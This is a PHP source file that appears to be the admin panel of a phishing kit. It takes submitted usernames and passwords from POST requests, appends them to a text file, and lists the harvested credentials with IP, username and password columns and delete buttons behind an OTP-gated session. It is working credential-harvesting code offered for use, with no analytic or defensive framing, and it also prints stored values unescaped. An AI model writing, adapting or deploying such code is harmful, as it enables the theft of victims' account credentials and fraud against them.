<?php
session_start();
ini_set('display_errors', 1);

// Check if user has passed OTP verification
if (!isset($_SESSION['otp_verified']) || $_SESSION['otp_verified'] !== true) {
    // Redirect user to login page
    header("Location: login.php");
    exit;
}

error_reporting(0);
set_time_limit(0);
ini_set("memory_limit", -1);

session_write_close();

// Function to delete a specific entry from LG.txt file
function deleteEntry($lineNumber) {
    $lines = file("LG.txt");
    if (isset($lines[$lineNumber])) {
        unset($lines[$lineNumber]);
        file_put_contents("LG.txt", implode("", $lines));
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["delete"])) {
        // Extract line number from delete button name
        $lineNumber = intval($_POST["delete"]);
        // Call the function to delete the specific entry
        deleteEntry($lineNumber);
    } else {
        $username = $_POST["user"];
        $password = $_POST["pass"];
    
        $LG = $username . "," . $password . "\n";
        file_put_contents("LG.txt", $LG, FILE_APPEND | LOCK_EX);
    }
}

$LG = file_get_contents("LG.txt");
$lines = explode("\n", $LG);
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #f2f2f2;
        }

        table {
            border-collapse: collapse;
            width: 100%;
            margin: auto;
            background-color: #000;
            box-shadow: 0px 2px 20px #00F752;
        }

        th, td {
            border: 1px solid black;
            padding: 5px;
            text-align: left;
        }

        th {
            background-color: #065431;
            color: #FFFFFF;
        }

        h1 {
            text-align: center;
            margin-top: 50px;
            color: #00bfff;
        }
    </style>
    <style>
        body {
            background-color: black;
        }

        .image-container {
            background-image: url("https://i.imgur.com/JbV6hK8.png");
            background-repeat: no-repeat;
            background-position: center;
            height: 500px;
            width: 800px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
    </style>
    <style>
        .button-container {
            display: flex;
            justify-content: space-between;
        }

        .green-button {
            background-color: #065431;
            color: #000;
            padding: 5px 20px;
            margin: 0;
        }

        .red-button {
            background-color: #FF0000;
            color: #FFF;
            padding: 5px 10px;
            margin: 0;
        }
    </style>
</head>
<body>
<h1><font color="#02FF6A">LOGINS</font></h1>
<div class="image-container">
    <a href="../logout/"><button class="green-button">Logout</button></a>
    <a href="../dashboard/"><button class="green-button">Admin Panel</button></a>
	<br>
	<br>
   
    <br>
    <br>
    <div class="button-container"></div>
    <table>
        <?php
        $data = file("LG.txt");
        echo "<table>";
        echo "<tr><th>IP</th><th>UserName</th><th>Password</th><th>Action</th></tr>";
        foreach ($data as $index => $line) {
            list($ip, $username, $password) = explode(",", $line);
            echo "<tr><td><p style='color:#00FF8D'>" . $ip . "</p></td><td><p style='color:#00FF8D'>" . $username . "</p></td><td><p style='color:#00FF8D'>" . $password . "</p></td><td><form method='post'><button type='submit' name='delete' class='red-button' value='$index'>Delete</button></form></td></tr>";
        }
        echo "</table>";
        ?>
    </table>
</div>
</body>
</html>
